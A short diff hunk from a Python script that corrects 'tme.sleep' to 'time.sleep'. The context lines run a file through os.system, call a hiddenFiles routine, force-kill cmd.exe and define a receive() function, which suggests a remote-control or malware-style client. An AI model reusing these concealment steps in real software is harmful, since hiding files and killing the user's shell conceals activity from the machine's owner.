@@ -51,7 +51,7 @@ while tryit == False:
         time.sleep(0.5)
         os.system(getFileName())
         modif.hiddenFiles()
-        tme.sleep(2)
+        time.sleep(2)
         subprocess.Popen("taskkill /IM cmd.exe /F")
 
 def receive():
